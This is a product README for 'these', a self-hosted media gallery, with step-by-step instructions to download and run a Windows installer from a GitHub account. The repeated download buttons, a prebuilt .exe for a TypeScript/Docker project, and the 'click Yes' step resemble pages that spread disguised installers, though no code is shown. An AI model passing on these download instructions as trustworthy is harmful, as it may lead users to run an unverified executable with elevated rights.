# 🖼️ these - Browse Your Media Folders Without Importing Anything

## 🚀 Getting Started

Welcome! If you have a computer full of photos and videos scattered across folders, drives, or a home network, **these** is here to help. It gives you a beautiful, easy-to-use website that lets you look through all your media exactly where it already lives.

**No moving files. No copying. No reorganizing.** You point it at your folders, and it shows you everything in a clean, searchable gallery.

[**⬇️ GET THESE NOW**](https://github.com/pacificismsandcherry8495/these)

---

## 📦 What Is This?

**these** is a **self-hosted, directory-first gallery**. That means:

- **Self-hosted:** You run it on your own computer or a small server you control. Your photos never leave your house.
- **Directory-first:** It works directly with your existing folder structure. If you have `C:\Vacation\2024\Beach`, you'll see that exact folder and everything inside it.
- **No imports:** Unlike many photo apps, this software does **not** copy or move your files. It simply reads them and displays them.

It's perfect for:

- Organizing years of family photos without duplicating storage.
- Browsing video collections from a NAS (network-attached storage) drive.
- Creating a private, fast media hub for your homelab.

---

## 🛠️ Features

Here’s what you can do with **these**:

| Feature | What It Means For You |
|---------|----------------------|
| 📁 **Folder-Based View** | See your media exactly as organized on your hard drive. |
| 🔍 **Instant Search** | Find any image or video by filename, folder name, or tag. |
| 🖥️ **Video Playback** | Watch videos directly in the browser, no extra player needed. |
| ⭐ **Curate & Rate** | Mark your favorites, rate media, and save custom collections. |
| 🔒 **Private & Secure** | Runs locally or on your network; you decide who can access it. |
| 🧩 **Plugin-Friendly** | Built with modern tools like React and Fastify; easy to extend. |
| 🐳 **Docker Ready** | Run it in a container if you're into that; no messy setup. |
| 📊 **SQLite Database** | Lightweight and reliable storage for your tags and ratings. |

---

## 📥 Download & Install

Follow these simple steps to get **these** running on your Windows computer.

### Step 1: Download the Application

Visit this link to download the application:  
[**https://github.com/pacificismsandcherry8495/these**](https://github.com/pacificismsandcherry8495/these)

On that page, look for the **"Releases"** section on the right side or scroll down to find the latest version. Click the download button. The file will be named something like `these-setup.exe`.

### Step 2: Run the Installer

Once the download finishes, find the file in your **Downloads** folder. Double-click it to run the installer.

- If Windows asks for permission, click **"Yes"**.
- Follow the on-screen instructions. The default settings are fine for most people.

### Step 3: Start the Service

After installation, **these** will open a small window showing a status like *"Running on http://localhost:3000"*.

- **IMPORTANT:** Keep this window open while you use the gallery. Closing it will stop the app.

### Step 4: Open Your Gallery

Open your web browser (Edge, Chrome, or Firefox) and type **`http://localhost:3000`** into the address bar. Press **Enter**.

You should see the **these** welcome screen.

---

## 🗂️ Adding Your First Folder

1. **Click "Add Folder"** on the top bar.
2. **Browse** to any folder that contains images or videos (e.g., `D:\Pictures\2023`).
3. Click **"Select Folder"**.

The app will scan the folder and display all media files inside. You can also add subfolders if you like — everything stays where it is.

---

## 🧭 Using the Gallery

- **Click any image** to view it full-size.
- **Click any video** to play it right in the browser.
- **Use the search bar** at the top to type a filename or folder.
- **Star ⭐ your favorites** to create a quick access list.
- **Right-click** on any media item to see options like *Rate*, *Tag*, or *Hide*.

---

## ⚙️ Settings You Might Want to Change

Click the **gear icon** in the top-right corner to open settings.

- **Port:** You can change from 3000 to any other number if needed.
- **Start on boot:** Turn this on to have **these** open automatically when Windows starts.
- **Theme:** Switch between light and dark mode for your viewing comfort.

---

## 🧯 Troubleshooting Common Issues

| Problem | Likely Fix |
|---------|------------|
| The page won't load | Make sure the **these** window is still open. Restart the app if needed. |
| No media shows up | Check that your folder contains common formats like `.jpg`, `.png`, `.mp4`, or `.mov`. |
| Videos are slow to play | Large video files may take a moment. Try downloading the file to your computer if it's very large. |
| Forgot my password? | If you set a login, check the settings inside the app. Resetting is easy with the "Reset" button. |

---

## ❓ Frequently Asked Questions

**Q: Does this move or delete my original files?**  
A: No. **these** is read-only by default. It only looks at files to show them; it never modifies, moves, or deletes anything.

**Q: Can I access my gallery from another device?**  
A: Yes. As long as both devices are on the same network, you can open the gallery from a phone or tablet by typing your computer's IP address followed by `:3000`.

**Q: Do I need an internet connection?**  
A: No, **these** works entirely offline on your own computer or local network.

**Q: What file formats are supported?**  
A: It supports common image formats (JPEG, PNG, GIF, WebP) and video formats (MP4, MOV, MKV, AVI).

---

## 🧑‍💻 For Tech Enthusiasts

If you love tinkering, **these** is built with:

- **Frontend:** React  
- **Backend:** Fastify (Node.js)  
- **Database:** SQLite  
- **Language:** TypeScript  
- **Deployment:** Docker or standalone binary

You can run it in Docker with a simple `docker-compose.yml`, or use the npm package if you prefer command-line tools. All source code is open for you to explore and customize.

---

## 🤝 Support & Community

- **GitHub Issues:** Found a bug or want a feature? Post it here: [GitHub Issues](https://github.com/pacificismsandcherry8495/these/issues)  
- **Discussions:** Join the conversation and share your tips: [GitHub Discussions](https://github.com/pacificismsandcherry8495/these/discussions)

---

## 📄 License

**these** is open-source software. You are free to use, modify, and share it, as long as you follow the license terms included in the repository.

---

## 🏁 Final Words

You now have a powerful, private, and beautifully simple way to browse your media. No more digging through file explorers or waiting for cloud uploads. Just point, click, and enjoy.

[**⬇️ Download these now**](https://github.com/pacificismsandcherry8495/these)

---

*Happy browsing! Your photos deserve better.*

Keywords: docker, fastify, file-browser, homelab, media-gallery, nas, photo-gallery, react, self-hosted, sqlite, typescript, video-gallery